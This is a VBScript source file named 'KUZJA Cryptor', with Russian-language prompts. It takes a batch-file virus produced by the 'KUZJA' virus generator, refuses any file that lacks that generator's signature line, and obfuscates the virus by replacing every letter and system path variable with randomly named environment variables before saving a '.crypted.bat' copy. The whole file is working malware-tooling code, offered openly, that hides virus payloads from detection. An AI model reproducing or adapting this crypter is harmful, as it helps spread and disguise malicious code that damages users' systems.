Randomize
d=30
while d>0
stst=""
i=2
while i>0
a=" "&int(rnd*100)
if a<26 then
if a=0 then b="A"
if a=1 then b="B"
if a=2 then b="C"
if a=3 then b="D"
if a=4 then b="E"
if a=5 then b="F"
if a=6 then b="G"
if a=7 then b="H"
if a=8 then b="I"
if a=9 then b="J"
if a=10 then b="K"
if a=11 then b="L"
if a=12 then b="M"
if a=13 then b="N"
if a=14 then b="O"
if a=15 then b="P"
if a=16 then b="Q"
if a=17 then b="R"
if a=18 then b="S"
if a=19 then b="T"
if a=20 then b="U"
if a=21 then b="V"
if a=22 then b="W"
if a=23 then b="X"
if a=24 then b="Y"
if a=25 then b="Z"
stst=stst&b
i=i-1
end if
wend
execute("tst="&""""&stst&"""")
if tst<>str1 and tst<>str2 and tst<>str3 and tst<>str4 and tst<>str5 and tst<>str6 and tst<>str7 and tst<>str8 and tst<>str9 and tst<>str10 and tst<>str11 and tst<>str12 and tst<>str13 and tst<>str14 and tst<>str15 and tst<>str16 and tst<>str17 and tst<>str18 and tst<>str19 and tst<>str20 and tst<>str21 and tst<>str22 and tst<>str23 and tst<>str24 and tst<>str25 and tst<>str26 then
execute("str"&d&"="&""""&stst&"""")
d=d-1
end if
wend
pst="@set ¦=%temp%"&vbcrlf&"@set •=%systemroot%"&vbcrlf&"@set §=%systemdrive%"&vbcrlf&"set ¶=%windir%"&vbcrlf&"set ¬=%comspec%"&vbcrlf&"@set "&str1&"=a"&vbcrlf&"@set "&str2&"=b"&vbcrlf&"@set "&str3&"=c"&vbcrlf&"@set "&str4&"=d"&vbcrlf&"@set "&str5&"=e"&vbcrlf&"@set "&str6&"=f"&vbcrlf&"@set "&str7&"=g"&vbcrlf&"@set "&str8&"=h"&vbcrlf&"@set "&str9&"=i"&vbcrlf&"@set "&str10&"=j"&vbcrlf&"@set "&str11&"=k"&vbcrlf&"@set "&str12&"=l"&vbcrlf&"@set "&str13&"=m"&vbcrlf&"@set "&str14&"=n"&vbcrlf&"@set "&str15&"=o"&vbcrlf&"@set "&str16&"=p"&vbcrlf&"@set "&str17&"=q"&vbcrlf&"@set "&str18&"=r"&vbcrlf&"@set "&str19&"=s"&vbcrlf&"@set "&str20&"=t"&vbcrlf&"@set "&str21&"=u"&vbcrlf&"@set "&str22&"=v"&vbcrlf&"@set "&str23&"=w"&vbcrlf&"@set "&str24&"=x"&vbcrlf&"@set "&str25&"=y"&vbcrlf&"@set "&str26&"=z"
set fso=createobject("scripting.filesystemobject")
fpt=inputbox ("Введите имя файла","KUZJA Cryptor","KUZJA.BAT")
Set fppt = FSO.GetFile(wscript.scriptfullname)
ffpt =fppt.ParentFolder.Path
Set File = FSO.GetFile(""&ffpt&"\"&fpt&"")
Set TextStream = File.OpenAsTextStream(1)
prst=TextStream.readline()
if prst<>"@echo This virus created by generator KUZJA" then
msgbox "Выбранный вами файл не является файлом вируса KUZJA!",16,"Ошибка!!!"
wscript.quit(0)
end if
stln=textstream.readall()
TextStream.Close
stln=replace(stln,"%temp%","%¦%")
stln=replace(stln,"%systemroot%","%•%")
stln=replace(stln,"%systemdrive%","%§%")
stln=replace(stln,"%systemdrive%","%§%")
stln=replace(stln,"%comspec%","%¬%")
stln=replace(stln,"a","%"&str1&"%")
stln=replace(stln,"b","%"&str2&"%")
stln=replace(stln,"c","%"&str3&"%")
stln=replace(stln,"d","%"&str4&"%")
stln=replace(stln,"e","%"&str5&"%")
stln=replace(stln,"f","%"&str6&"%")
stln=replace(stln,"g","%"&str7&"%")
stln=replace(stln,"h","%"&str8&"%")
stln=replace(stln,"i","%"&str9&"%")
stln=replace(stln,"j","%"&str10&"%")
stln=replace(stln,"k","%"&str11&"%")
stln=replace(stln,"l","%"&str12&"%")
stln=replace(stln,"m","%"&str13&"%")
stln=replace(stln,"n","%"&str14&"%")
stln=replace(stln,"o","%"&str15&"%")
stln=replace(stln,"p","%"&str16&"%")
stln=replace(stln,"q","%"&str17&"%")
stln=replace(stln,"r","%"&str18&"%")
stln=replace(stln,"s","%"&str19&"%")
stln=replace(stln,"t","%"&str20&"%")
stln=replace(stln,"u","%"&str21&"%")
stln=replace(stln,"v","%"&str22&"%")
stln=replace(stln,"w","%"&str23&"%")
stln=replace(stln,"x","%"&str24&"%")
stln=replace(stln,"y","%"&str25&"%")
stln=replace(stln,"z","%"&str26&"%")
set textsteam=fso.createtextfile(""&ffpt&"\"&fpt&""&".crypted.bat")
textsteam.writeline pst&vbcrlf&stln
textsteam.close
msgbox "Файл успешно закриптован!",64,"Готово!"





